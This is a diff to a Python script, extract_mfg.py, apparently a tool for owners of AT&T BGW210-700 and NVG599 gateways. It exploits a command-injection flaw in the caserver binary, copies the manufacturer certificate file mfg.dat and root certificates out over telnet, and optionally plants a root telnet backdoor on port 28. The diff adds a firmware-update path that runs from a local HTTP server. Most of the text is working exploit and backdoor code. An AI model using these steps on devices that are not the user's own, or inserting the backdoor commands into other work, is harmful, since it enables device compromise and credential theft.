@@ -12,9 +12,16 @@ import tarfile
 import shutil
 import glob
 import urllib3
+import http.server
+import socketserver
+import threading
 
+LATEST_BGW210_FIRMWARE = "2.6.4"
+LATEST_NVG599_FIRMWARE = "11.5.0h0d51"
+
+SERVER_ADDRESS = "192.168.1.50"
+SERVER_PORT = 8000
 DEVICE_ADDR = "192.168.1.254"
-
 
 ##########################################
 # This area contains all aux functions
@@ -43,14 +50,20 @@ def verify_input(res):
 
 
 def usage():
-    return "extract_mfg.py --access_code=<enter_access_code> --install_backdoor=y \nthe device access code is printed on the side of " \
+    return "extract_mfg.py --access_code=\"<enter_access_code>\" --installBackdoor --updateFirmware \nthe device access code is printed on the side of " \
            "your modem \nit's needed to login and exploit the caserver binary "
 
+def create_server():
+    handler = http.server.SimpleHTTPRequestHandler
+    httpd = socketserver.TCPServer(("", SERVER_PORT), handler)
+    print("serving at port: " + str(SERVER_PORT))
+    httpd.serve_forever()
 
 def start():
     parser = argparse.ArgumentParser(usage=usage())
     parser.add_argument("--access_code", help="enter access code here", required=True)
-    parser.add_argument("--install_backdoor", help="install backdoor telnet port 28", required=False)
+    parser.add_argument("--installBackdoor", action='store_true', help="install backdoor telnet port 28", required=False)
+    parser.add_argument("--updateFirmware", action='store_true', help="update firmware to version specified", required=False)
     args = parser.parse_args()
 
     if not is_open(80):
@@ -80,34 +93,43 @@ def start():
     print("Serial: " + serial_number)
     directory = model_number + "_" + serial_number
 
+    latestFirmware = ""
+    updateFirmware = args.updateFirmware and ver_string != LATEST_BGW210_FIRMWARE and ver_string != LATEST_NVG599_FIRMWARE
+    if updateFirmware:
+        thread = threading.Thread(target=create_server, args=())
+        thread.daemon = True
+        thread.start()
+
+    telnet28 = is_open(28)
+    telnet9999 = is_open(9999)
     if model_number.find("BGW210-700") != -1:
-        if ver_string.find("1.0.29") == -1:
+        latestFirmware = "http://"+SERVER_ADDRESS+":"+str(SERVER_PORT)+"/firmware/spTurquoise210-700_"+LATEST_BGW210_FIRMWARE+".bin"
+        if ver_string.find("1.0.29") == -1 and not telnet28 and not telnet9999:
             print("Incorrect software version")
             print("Downgrade BGW210-700 to 1.0.29 and come back")
             sys.exit(0)
-        else:
+        elif not telnet28 and not telnet9999:
             exploit(args.access_code)
-            extractfiles(args.install_backdoor, directory)
     elif model_number.find("NVG599") != -1:
-        if ver_string.find("9.2.2h0d83") == -1 & ver_string.find("9.2.2h0d79") == -1:
+        latestFirmware = "http://"+SERVER_ADDRESS+":"+str(SERVER_PORT)+"/firmware/spnvg599-"+LATEST_NVG599_FIRMWARE+".bin"
+        if ver_string.find("9.2.2h0d83") == -1 and ver_string.find("9.2.2h0d79") == -1 and not telnet28 and not telnet9999:
             print("Incorrect software version")
             print("Downgrade NVG599 to 9.2.2h0d83, or upgrade to 9.2.2h0d79 and come back")
             sys.exit(0)
-        else:
+        elif not telnet28 and not telnet9999:
             exploit(args.access_code)
-            extractfiles(args.install_backdoor, directory)
     else:
         print("Incorrect Gateway Model for Exploit, it only works on a BGW210-700 or NVG599")
 
-    print("Would you like to extract files from telnet port 9999?")
-    print("y/n> ")
-    res = input()
-    verify_input(res)
-    if res == "y":
-        extractfiles(args.install_backdoor, directory)
+    # Not a BGW210 or NVG599 but can still attempt to extract files. This part works for already rooted NVG589 or other models
+    if telnet28:
+        print("Attempting to extract files from telnet port 28")
+        extractfiles(28, args.access_code, False, directory, latestFirmware, updateFirmware)
+    elif telnet9999:
+        print("Attempting to extract files from telnet port 9999")
+        extractfiles(9999, args.access_code, args.installBackdoor, directory, latestFirmware, updateFirmware)
     else:
         sys.exit(1)
-
 
 ##########################################
 # This area contains all functions
@@ -115,9 +137,9 @@ def start():
 ##########################################
 
 def send_command(tn, cmd):
-    tn.write(cmd)
+    tn.write(cmd.encode('ascii') + b"\n")
     time.sleep(1)
-    tn.read_very_eager()
+    print(tn.read_very_eager().decode('ascii'))
 
 # responsible for authenticating to the RG
 def login(password):
@@ -163,48 +185,60 @@ def exploit(access_code):
 
     print("Command injection success!\n")
 
-def extractfiles(install_backdoor, directory):
-    mount_cp_files_cmd1 = "mkdir /tmp/certs\n".encode('ascii')
-    mount_cp_files_cmd2 = "mount mtd:mfg -t jffs2 /mfg && cp /mfg/mfg.dat /tmp/certs/ && umount /mfg\n".encode('ascii')
-    mkdir_tmp_images_cmd = "mkdir /tmp/images\n".encode('ascii')
-    mount_imgs_cmd = "mount -o blind /tmp/images /www/att/images\n".encode('ascii')
-    mount_cp_files_cmd3 = "cp /etc/rootcert/*.der /tmp/certs\n".encode('ascii')
-    mount_cp_files_cmd4 = "cd /tmp/certs\n".encode('ascii')
-    mount_cp_files_cmd5 =  "tar cf Files\ from\ Gateway.tar *.d*\n".encode('ascii')
-    mount_cp_files_cmd6 =  "cp Files\ from\ Gateway.tar /www/att/images\n".encode('ascii')
-    create_telnet_backdoor_cmd = "echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28\npfs -a /var/etc/inetd.d/telnet28\npfs -s\n".encode('ascii')
-    reboot_cmd = "reboot\n".encode('ascii')
+def extractfiles(port, access_code, installBackdoor, directory, latestFirmware, updateFirmware):
+    mount_cp_files_cmd1 = "mkdir /tmp/certs"
+    mount_cp_files_cmd2 = "mount mtd:mfg -t jffs2 /mfg && cp /mfg/mfg.dat /tmp/certs/ && umount /mfg"
+    mkdir_tmp_images_cmd = "mkdir /tmp/images"
+    mount_imgs_cmd = "mount -o blind /tmp/images /www/att/images"
+    mount_cp_files_cmd3 = "cp /etc/rootcert/*.der /tmp/certs"
+    mount_cp_files_cmd4 = "cd /tmp/certs"
+    mount_cp_files_cmd5 =  "tar cf Files\ from\ Gateway.tar *.d*"
+    mount_cp_files_cmd6 =  "cp Files\ from\ Gateway.tar /www/att/images"
+    create_telnet_backdoor_cmd = "echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28\npfs -a /var/etc/inetd.d/telnet28\npfs -s"
+    nsh_telnet_cmd = "/bin/nsh"
+    reboot_cmd = "reboot"
+
+    if not is_open(port):
+        print("telnet is not open - fail")
+        fail()
 
     print("Opening telnet shell")
-    tn = telnetlib.Telnet(host=DEVICE_ADDR, port=9999)
+    tn = telnetlib.Telnet(host=DEVICE_ADDR, port=port)
 
-    print(mount_cp_files_cmd1)
+    if port == 28:
+        send_command(tn, "admin")
+        send_command(tn, access_code)
+        send_command(tn, "!")
+
     send_command(tn, mount_cp_files_cmd1)
-    print(mount_cp_files_cmd2)
     send_command(tn, mount_cp_files_cmd2)
-    print(mkdir_tmp_images_cmd)
     send_command(tn, mkdir_tmp_images_cmd)
-    print(mount_imgs_cmd)
     send_command(tn, mount_imgs_cmd)
-    print(mount_cp_files_cmd3)
     send_command(tn, mount_cp_files_cmd3)
-    print(mount_cp_files_cmd4)
     send_command(tn, mount_cp_files_cmd4)
-    print(mount_cp_files_cmd5)
     send_command(tn, mount_cp_files_cmd5)
-    print(mount_cp_files_cmd6)
     send_command(tn, mount_cp_files_cmd6)
     print("downloading files")
     url = 'http://' + DEVICE_ADDR + '/images/Files from Gateway.tar'
     wget.download(url)
     print("")
 
-    if install_backdoor == "y":
+    if installBackdoor and port == 9999:
         print("installing backdoor telnet port 28")
         send_command(tn, create_telnet_backdoor_cmd)
 
-    print("Rebooting gateway")
-    send_command(tn, reboot_cmd)
+    if updateFirmware and latestFirmware:
+        if port == 28:
+            send_command(tn, "exit")
+        if port == 9999:
+            send_command(tn, nsh_telnet_cmd)
+            send_command(tn, "admin")
+            send_command(tn, access_code)
+        print("Updating firmware to latest")
+        send_command(tn, "fwinstall " + latestFirmware)
+        print(tn.read_until(b"validated", 45).decode('ascii'))
+    else:
+        send_command(tn, "reboot")
 
     destination = directory + "/Files_from_Gateway"
     if not os.path.exists (destination):
